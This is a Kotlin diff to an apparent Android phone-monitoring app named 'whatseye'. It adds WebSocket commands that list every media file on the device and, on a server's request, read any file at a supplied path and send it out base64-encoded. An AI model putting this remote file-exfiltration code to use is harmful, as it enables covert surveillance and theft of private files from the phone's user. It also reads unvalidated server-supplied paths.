@@ -7,26 +7,36 @@ import android.content.Context
 import android.content.pm.PackageManager
 import android.location.Location
 import android.location.LocationManager
+import android.net.Uri
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
+import android.util.Base64
 import android.util.Log
 import com.google.gson.Gson
 import androidx.core.content.ContextCompat
+import com.example.whatseye.MediaReader
 import com.example.whatseye.dataType.db.ScheduleDataBase
 import com.example.whatseye.api.managers.BadWordsManager
 import com.example.whatseye.api.managers.LockManager
 import com.example.whatseye.api.managers.PasskeyManager
+import com.example.whatseye.dataType.UriTypeAdapter
 import com.example.whatseye.dataType.data.NotificationData
 import com.example.whatseye.dataType.data.ScheduleData
 import com.example.whatseye.services.AlwaysRunningService
 import com.example.whatseye.utils.createNotification
 import com.example.whatseye.utils.createNotificationChannel
 import com.google.android.gms.location.*
+import com.google.gson.GsonBuilder
 import okhttp3.*
 import org.json.JSONObject
 import java.util.concurrent.TimeUnit
 import kotlinx.coroutines.*
+import okio.ByteString
+import okio.ByteString.Companion.toByteString
+import java.io.File
+import java.io.FileInputStream
+import java.io.IOException
 
 class WebSocketClientGeneral(private val context: Context, private val url: String) {
 
@@ -227,6 +237,13 @@ class WebSocketClientGeneral(private val context: Context, private val url: Stri
                     //LoggedInActivity.getInstance()?.getChatRoom(name)
                 }
             }
+            "REQUEST_FILES"->{
+                sendFilesList()
+            }
+            "REQUEST_FILE_URI"->{
+                val uri = jsonObject.getString("uri")
+                sendFileOverWebSocket(Uri.parse(uri))
+            }
         }
     }
 
@@ -346,6 +363,24 @@ class WebSocketClientGeneral(private val context: Context, private val url: Stri
         webSocket?.send(errorJson)
     }
 
+    private fun sendFilesList() {
+        val mediaReader = MediaReader(context)
+        val mediaFiles = mediaReader.getAllMediaFiles() // From previous MediaReader code
+        val gson = GsonBuilder()
+            .registerTypeAdapter(Uri::class.java, UriTypeAdapter())
+            .setPrettyPrinting()
+            .create()
+        val json = gson.toJson(mediaFiles)
+
+        val dataJson = JSONObject().apply {
+            put("type", "RESPONSE_FILES")
+            put("files", json)
+        }.toString()
+
+        webSocket?.send(dataJson)
+    }
+
+
     private fun showPinChangeNotification() {
         createNotificationChannel(context, "CONFIRM_PIN", "Always Running Service Channel")
         val notification = createNotification(
@@ -365,6 +400,28 @@ class WebSocketClientGeneral(private val context: Context, private val url: Stri
 
         webSocket?.send(confirmationMessage)
     }
+    private fun sendFileOverWebSocket(fileUri: Uri) {
+        try {
+            val filePath = fileUri.path ?: return
+            val file = File(filePath)
+            if (!file.exists() || !file.canRead()) return
+
+            val fileBytes = file.readBytes() // Read the entire file
+            val base64Data = Base64.encodeToString(fileBytes, Base64.NO_WRAP)
+
+            val jsonResponse = JSONObject().apply {
+                put("type", "RESPONSE_FILE_URI")
+                put("file", base64Data)
+            }
+
+            webSocket?.send(jsonResponse.toString())
+            webSocket?.close(1000, "File transfer complete")
+
+        } catch (e: IOException) {
+            e.printStackTrace()
+        }
+    }
+
 
     fun sendNotification(notificationData: NotificationData) {
         val message = JSONObject().apply {
@@ -390,7 +447,6 @@ class WebSocketClientGeneral(private val context: Context, private val url: Stri
         }.toString()
         webSocket?.send(message)
     }
-
 
 
     fun sendContactChat(contacts: String) {
